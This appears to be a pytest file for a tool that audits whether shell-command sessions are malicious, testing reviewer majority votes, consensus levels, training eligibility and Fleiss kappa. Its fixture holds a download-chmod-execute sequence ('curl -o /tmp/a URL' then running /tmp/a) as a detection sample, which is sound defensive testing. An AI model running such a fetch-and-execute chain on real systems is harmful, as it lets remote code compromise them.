from __future__ import annotations

import pytest

from cmdrisk.teacher.audit import AuditCase, ProxyAuditor
from cmdrisk.teacher.prompts import reviewer_payload
from cmdrisk.teacher.responses import ProxyReviewResponse


class FakeReviewer:
    def __init__(self, response: ProxyReviewResponse | Exception) -> None:
        self.response = response
        self.contexts: list[dict[str, object]] = []

    def review(self, review_context: dict[str, object]) -> ProxyReviewResponse:
        self.contexts.append(review_context)
        if isinstance(self.response, Exception):
            raise self.response
        return self.response


def _review(
    decision: str,
    evidence: int | None = None,
    *,
    technique: str | None = None,
) -> ProxyReviewResponse:
    techniques = {technique: [evidence]} if technique is not None and evidence is not None else {}
    return ProxyReviewResponse(
        decision=decision,
        first_evidence_index=evidence,
        technique_evidence=techniques,
        tactics=["TA0011"] if decision == "malicious" else [],
        confidence=0.9,
    )


def _case(session_id: str = "case-1") -> AuditCase:
    return AuditCase(
        session_id=session_id,
        commands=[
            {"cmd": "whoami"},
            {"cmd": "curl -o /tmp/a URL"},
            {"cmd": "chmod +x /tmp/a"},
            {"cmd": "/tmp/a"},
        ],
        gold={"malicious": 1, "first_evidence_index": 3},
        prediction={"malicious_probability": 0.97},
    )


def test_reviewer_context_hides_gold_prediction_and_meta() -> None:
    context = reviewer_payload(_case().model_dump(mode="json"))
    assert set(context) == {"session_id", "commands"}
    serialized = str(context)
    assert "gold" not in serialized
    assert "prediction" not in serialized
    assert "0.97" not in serialized


def test_three_reviewer_majority_builds_high_consensus() -> None:
    reviewers = (
        FakeReviewer(_review("malicious", 2, technique="T1105")),
        FakeReviewer(_review("malicious", 2, technique="T1105")),
        FakeReviewer(_review("malicious", 3, technique="T1222")),
    )
    result = ProxyAuditor(reviewers).audit_case(_case())
    assert result.decision == "malicious"
    assert result.consensus == "high"
    assert result.first_evidence_index == 2
    assert result.techniques == ["T1105"]
    assert result.training_eligible is True


def test_two_to_one_review_is_medium_not_training_eligible() -> None:
    reviewers = (
        FakeReviewer(_review("malicious", 2, technique="T1105")),
        FakeReviewer(_review("malicious", 2, technique="T1105")),
        FakeReviewer(_review("benign")),
    )
    result = ProxyAuditor(reviewers).audit_case(_case())
    assert result.decision == "malicious"
    assert result.consensus == "medium"
    assert result.training_eligible is False


def test_split_vote_is_unresolved() -> None:
    reviewers = (
        FakeReviewer(_review("malicious", 2, technique="T1105")),
        FakeReviewer(_review("benign")),
        FakeReviewer(_review("uncertain")),
    )
    result = ProxyAuditor(reviewers).audit_case(_case())
    assert result.decision == "unresolved"
    assert result.consensus == "unresolved"
    assert result.training_eligible is False


def test_reviewer_error_is_preserved_as_unresolved_record() -> None:
    reviewers = (
        FakeReviewer(RuntimeError("provider unavailable")),
        FakeReviewer(_review("benign")),
        FakeReviewer(_review("benign")),
    )
    result = ProxyAuditor(reviewers).audit_case(_case())
    assert result.decision == "benign"
    assert result.consensus == "medium"
    assert result.votes[0].decision == "error"
    assert "provider unavailable" in (result.votes[0].error or "")


def test_fleiss_kappa_is_reported_for_complete_reviews() -> None:
    reviewers = (
        FakeReviewer(_review("malicious", 2, technique="T1105")),
        FakeReviewer(_review("malicious", 2, technique="T1105")),
        FakeReviewer(_review("malicious", 2, technique="T1105")),
    )
    report = ProxyAuditor(reviewers).audit([_case("case-1")])
    assert report.fleiss_kappa is None
    assert report.fleiss_cases == 1

    unanimous = (
        FakeReviewer(_review("malicious", 2, technique="T1105")),
        FakeReviewer(_review("malicious", 2, technique="T1105")),
        FakeReviewer(_review("malicious", 2, technique="T1105")),
    )
    # Reuse three per-case auditor fixtures because reviewer instances are stateful mocks.
    first = ProxyAuditor(unanimous).audit_case(_case("case-1"))
    benign_reviewers = (
        FakeReviewer(_review("benign")),
        FakeReviewer(_review("benign")),
        FakeReviewer(_review("benign")),
    )
    second = ProxyAuditor(benign_reviewers).audit_case(_case("case-2"))
    from cmdrisk.teacher.audit import _fleiss_kappa

    kappa, count = _fleiss_kappa([first, second])
    assert count == 2
    assert kappa == pytest.approx(1.0)


def test_malicious_majority_without_in_range_evidence_is_unresolved() -> None:
    reviewers = (
        FakeReviewer(_review("malicious", 99, technique="T1105")),
        FakeReviewer(_review("malicious", 99, technique="T1105")),
        FakeReviewer(_review("benign")),
    )
    result = ProxyAuditor(reviewers).audit_case(_case())
    assert result.decision == "unresolved"
    assert result.consensus == "unresolved"
    assert result.first_evidence_index is None
    assert result.training_eligible is False
